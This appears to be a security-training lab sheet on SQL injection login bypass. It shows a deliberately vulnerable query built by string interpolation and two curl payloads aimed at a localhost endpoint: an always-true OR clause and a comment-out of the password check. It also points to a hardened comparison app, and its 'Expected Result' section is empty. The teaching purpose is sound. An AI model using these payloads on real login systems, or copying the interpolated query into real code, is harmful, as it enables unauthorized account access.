# Lab 1: SQL Injection Login Bypass

## Objective
Demonstrate how an attacker can bypass authentication by manipulating a vulnerable SQL query.

## Vulnerable Code
The target endpoint is at `/api/lab/login-vulnerable`. It uses the following raw SQL query:
```sql
SELECT * FROM "User" WHERE username = '${username}' AND "passwordHash" = '${password}'
```

## Instructions

1. **Start the application**: Ensure `npm run dev` is running.
2. **Execute the attack**: Use `curl` to send a malicious payload that makes the `WHERE` clause always true.

### Payload 1: Basic Bypass
This payload uses `' OR '1'='1` to ignore the password check.
```bash
curl -X POST http://localhost:3000/api/lab/login-vulnerable \
-H "Content-Type: application/json" \
-d '{"username": "admin", "password": "'\'' OR '\''1'\''='\''1"}'
```

### Payload 2: Commenting out the rest
This payload uses `--` to comment out the rest of the SQL query.
```bash
curl -X POST http://localhost:3000/api/lab/login-vulnerable \
-H "Content-Type: application/json" \
-d '{"username": "admin'\'' --", "password": "any"}'
```

## Expected Result
## Comparison: Main App Resilience
After seeing the attack succeed here, try the same payload on your main application to see it fail. 
See [Resilience Demonstration](../resilience_demo.md) for instructions.
